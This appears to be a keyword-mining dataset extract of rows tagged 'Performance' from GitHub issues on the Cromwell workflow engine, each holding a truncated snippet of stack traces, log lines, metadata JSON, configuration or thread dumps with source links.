Performance,9-ac4f4b3ea5b8 failed (during MaterializingWorkflowDescriptorState): Workflow input processing failed:; error in opening zip file; cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3$$anon$1: Workflow input processing failed:; error in opening zip file; 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:138); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:130); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:663); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.processEvent(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); 	at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.aroundReceive(MaterializeWorkflowDescriptorActor.scala:117); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1799:2893,concurren,concurrent,2893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1799,4,['concurren'],['concurrent']
Performance,"91)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157)""; },; {; causedBy: [ ],; message: ""scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304)""; },; {; causedBy: [ ],; message: ""scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37)""; },; {; causedBy: [ ],; message: ""scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60)""; },; {; causedBy: [ ],; message: ""akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55)""; },; {; causedBy: [ ],; message: ""akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91)""; },; {; causedBy: [ ],; message: ""scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12)""; },; {; causedBy: [ ],; message: ""scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81)""; },; {; causedBy: [ ],; message: ""akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91)""; },; {; causedBy: [ ],; message: ""akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40)""; },; {; causedBy: [ ],; message: ""akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43)""; },; {; causedBy: [ ],; message: ""akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260)""; },; {; causedBy: [ ],; message: ""akka.dispatc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143:2695,concurren,concurrent,2695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143,1,['concurren'],['concurrent']
Performance,9]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:892) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:886) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:10031,concurren,concurrent,10031,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,5,['concurren'],['concurrent']
Performance,9]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.CallMetadataBuilder$.build(CallMetadataBuilder.scala:232) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:95) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowMetadataBuilder$$anonfun$cromwell$engine$workflow$WorkflowMetadataBuilder$$buildWorkflowMetadata$2.apply(WorkflowMetadataBuilder.scala:85) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ~[cromw,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/927:2837,concurren,concurrent,2837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/927,1,['concurren'],['concurrent']
Performance,"9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7472,cache,cache,7472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,"9ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi; 1608597651575,*** COMPLETED LOCALIZATION ***; 1608597657265,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597658212,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi; 1608597660320,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597660807,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi; 1608597668004,[W::",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:198457,cache,cacheCopy,198457,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,": 15,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.289Z""; },; {; ""shardIndex"": 16,; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""backend"": ""Local"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:07.289Z""; }; ],; ""case_gatk_acnv_workflow.PadTargets"": [; {; ""Call caching read result"": ""Cache Hit: 6b52652e-a50d-4787-86b1-794e53958ada:case_gatk_acnv_workflow.PadTargets:-1"",; ""executionStatus"": ""Done"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/stdout"",; ""shardIndex"": -1,; ""outputs"": {; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""target_file"": ""/data/target/ice_targets.tsv"",; ""mem"": 1,; ""padding"": 250,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""isWGS"": false; },; ""returnCode"": 0,; ""backend"": ""Local"",; ""end"": ""2016-09-23T13:53:07.897Z"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2016-09-23T13:53:07.203Z"",; ""description"": ""Pending"",; ""endTime"": ""2016-09-23T13:53:07.212Z""; },; {; ""startTime"": ""2016-09-23T13:53:07.212Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2016-09-23T13:53:07.235Z""; },; {; ""startTime"": ""2016-09-23T13:53:07.235Z"",; ""description"": ""CheckingCallCache"",; ""endTime"": ""2016-09-23",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:76608,cache,cache,76608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['cache'],['cache']
Performance,": Call cache hit process had 0 total hit failures before completing successfully; ```. Can someone help me diagnose why call caching isn't near instantaneous, and what I can do to make it much faster? Happy to provide more information as necessary. Thanks!. Config:; ```; # See https://cromwell.readthedocs.io/en/stable/Configuring/; # this configuration only accepts double quotes! not singule quotes; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; file-hash-cache = true; }. # necessary for call result caching; # will need to stand up the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions""; runtime-attributes = """"""; String? docker; """"""; submit = ""/usr/bin/env bash ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mounted to in the container, so need to change the path with sed; submit-docker = """"""; singularity exec --cont",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:3659,cache,cache-results,3659,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['cache'],['cache-results']
Performance,": Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. java.lang.Throwable: Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixExc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:4543,concurren,concurrent,4543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,": WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""db-20"" #61 daemon prio=5 os_prio=31 tid=0x00007fb76b1f9000 nid=0xa303 waiting on condition [0x00000001325df000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0751828> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175);",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:14798,concurren,concurrent,14798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,": WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-5"" #65 prio=5 os_prio=31 tid=0x00007fb7706d2800 nid=0xab03 waiting on condition [0x00000001329eb000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:13920,concurren,concurrent,13920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,": WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-7"" #67 prio=5 os_prio=31 tid=0x00007fb7705a3000 nid=0xaf03 waiting on condition [0x00000001330c6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-6"" #66 prio=5 os_prio=31 tid=0x00007fb7705ef800 nid=0xad03 waiting on condition [0x0000000132aee000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:17",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:13042,concurren,concurrent,13042,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,": WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-8"" #68 prio=5 os_prio=31 tid=0x00007fb76ef84000 nid=0xb103 waiting on condition [0x0000000132bf1000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at 